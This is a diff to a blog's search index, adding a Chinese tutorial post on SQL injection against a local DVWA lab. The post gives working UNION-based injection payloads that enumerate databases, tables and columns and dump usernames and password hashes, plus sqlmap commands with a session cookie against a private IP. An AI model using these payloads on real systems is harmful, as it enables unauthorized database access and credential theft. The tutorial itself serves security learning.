@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>SQL注入之整数型注入、工具注入SQLmap</title>
+      <link href="/2023/09/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5SQLmap/"/>
+      <url>/2023/09/23/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E3%80%81%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5SQLmap/</url>
+      
+        <content type="html"><![CDATA[<h1 id="SQL注入之整数型注入、工具注入SQLmap"><a href="#SQL注入之整数型注入、工具注入SQLmap" class="headerlink" title="SQL注入之整数型注入、工具注入SQLmap"></a>SQL注入之整数型注入、工具注入SQLmap</h1><p>什么是sql注入可以参考我以前的文章：<a href="https://carrotst.github.io/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/">https://carrotst.github.io/2023/09/16/sql%E6%B3%A8%E5%85%A5%E6%BA%90%E4%BB%A3%E7%A0%81-%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E8%8A%82/</a></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p><code>phpstudy、dvwa、kali linux</code></p><p>先把<code>dvwa</code>环境搭起来，可以参考网上的文章！！！</p><p><strong>实验前先把 难度改成</strong> <code>low</code></p><h2 id="什么是联合注入"><a href="#什么是联合注入" class="headerlink" title="什么是联合注入"></a>什么是联合注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 表名 from 列名 union select 表明 from 列名 where 字段ID;</span><br></pre></td></tr></table></figure><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; order by 1 #</span></span><br></pre></td></tr></table></figure><p>没有报错说明存在有这个字段</p><p>直到报错就可以停了</p><p><img src="https://picss.sunbangyan.cn/2023/09/22/10svnbr.png"></p><p><strong>1 2 都是没有报错，说明存在 1 2字段；</strong></p><p>那就直接可以查看库名了</p><p><strong>mysql注释: #  –+</strong></p><p>不同版本都不一样</p><h3 id="常用的sql语句"><a href="#常用的sql语句" class="headerlink" title="常用的sql语句"></a>常用的sql语句</h3><ul><li>user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </li><li>version() 返回当前数据库的版本 </li><li>database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 </li><li>group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </li><li>@@datadir 数据库路径 </li><li>@@version_compile_os 操作系统版本</li></ul><h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><p><a href="https://www.w3school.com.cn/sql/sql_select.asp">select</a> 语句用于从表中选取数据。<br><a href="https://www.w3school.com.cn/sql/sql_union.asp">union</a> 操作符用于合并两个或多个 SELECT 语句的结果集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,database()#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/QLCtgCzA.png"></p><h3 id="sql版本号"><a href="#sql版本号" class="headerlink" title="sql版本号"></a><strong>sql版本号</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/qrFDVgss.png"></p><p>解释一下 为啥 有 <code>‘ #</code> 这些</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>看一下源代码</p><p>我们加了“ ‘ “ “ # “ 后——-#注释sql语句后面的内容</p><p><strong>在id&#x3D;1’ 后加上  “#” 即注释符号可将注释符号后的语句全部注释，这样我们就可以在注释符号前写入sql语句</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27;union select version(),database()#&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>如果里面是双引号那么：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&quot;</span>union select <span class="title function_ invoke__">version</span>(),<span class="title function_ invoke__">database</span>()<span class="comment">#&quot;;&#x27;;</span></span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点:"></a>知识点:</h3><p>information_schema是mysql自带的库，记录了该数据库<strong>所有的表名和字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">schemata ----所有的数据库名</span><br><span class="line">schemata_name ---数据库名字</span><br><span class="line">tables ----所有表名</span><br><span class="line">table_schema -----表所属数据库名</span><br><span class="line">table_name ----表的名字</span><br><span class="line">columns ---所有字段的名字</span><br><span class="line">table_schema ---字段所属数据库的名字</span><br><span class="line">table_name ---字段所属表名</span><br><span class="line">column_name ---字段名</span><br></pre></td></tr></table></figure><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,database() from information_schema.schemata#</span><br><span class="line">id=1&#x27; union select 1,database()# 两个都是也一样的 上面只是直观看出</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/DQYTmFI7.png"></p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,table_name from information_schema.tables where table_chema=&quot;dvwa&quot;#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/nkE01uA4.png"></p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure><p>![1695397426454](C:\Users\Awei\Documents\WeChat Files\wxid_7ui06hi8gav922\FileStorage\Temp\1695397426454.png)</p><p>看到了两个 关键的user password 就是我们要查看的</p><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(user,password) from users#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/65m4HZDq.png"></p><p>可以隔开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,group_concat(user,0x3a,password) from users#</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/22/SesLvMiU.png"></p><p><strong>用户名 :admin</strong></p><p><strong>密码:5f4dcc3b5aa765d61d8327deb882cf99(password)</strong></p><h1 id="工具注入"><a href="#工具注入" class="headerlink" title="工具注入"></a>工具注入</h1><p>这个就简单了，直接使用sqlmap 梭哈！！</p><h2 id="必备知识点："><a href="#必备知识点：" class="headerlink" title="必备知识点："></a>必备知识点：</h2><table><thead><tr><th>–dbs</th><th>查看所有的数据库</th></tr></thead><tbody><tr><td>-D</td><td>指定数据库</td></tr><tr><td>-T –tables</td><td>查看数据表</td></tr><tr><td>-C –dump</td><td>查看字段（用逗号隔开）</td></tr></tbody></table><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">获取cookie:<span class="attribute">PHPSESSID</span>=lc1met8rfiqmjrq3orpab5cpic; <span class="attribute">security</span>=low</span><br></pre></td></tr></table></figure><h2 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27;</span> <span class="attr">--dbs</span> <span class="attr">--cookie</span>=<span class="string">&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot;</span> <span class="attr">--batch</span></span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/vxouBmFQ.png"></p><h2 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot; --batch -D dvwa --tables</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/RGY4K2eW.png"></p><h2 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot; --batch -D dvwa -T users --columns </span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/6tHigBvd.png"></p><h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;10.83.0.160:81/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;PHPSESSID=lc1met8rfiqmjrq3orpab5cpic;security=low&quot; --batch -D dvwa -T users -C &quot;user,password&quot; --dump</span><br></pre></td></tr></table></figure><p><img src="https://img1.imgtp.com/2023/09/23/6tHigBvd.png"></p><h1 id="结束！！！"><a href="#结束！！！" class="headerlink" title="结束！！！"></a>结束！！！</h1>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web安全 </tag>
+            
+            <tag> sql注入 </tag>
+            
+            <tag> 源代码分析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【第三章】常见漏洞OWASP-TOP-10</title>
       <link href="/2023/09/22/%E3%80%90%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/"/>
       <url>/2023/09/22/%E3%80%90%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/</url>
@@ -22,13 +51,13 @@
       
         <tags>
             
+            <tag> web安全 </tag>
+            
             <tag> 常见漏洞 </tag>
             
             <tag> OWASP </tag>
             
             <tag> 知识点 </tag>
-            
-            <tag> web安全 </tag>
             
         </tags>
       
@@ -55,13 +84,13 @@
       
         <tags>
             
+            <tag> web安全 </tag>
+            
             <tag> 常见漏洞 </tag>
             
             <tag> OWASP </tag>
             
             <tag> 知识点 </tag>
-            
-            <tag> web安全 </tag>
             
         </tags>
       
@@ -88,13 +117,13 @@
       
         <tags>
             
+            <tag> web安全 </tag>
+            
             <tag> 常见漏洞 </tag>
             
             <tag> OWASP </tag>
             
             <tag> 知识点 </tag>
-            
-            <tag> web安全 </tag>
             
         </tags>
       
@@ -291,9 +320,9 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> xss </tag>
+            
+            <tag> web安全 </tag>
             
         </tags>
       
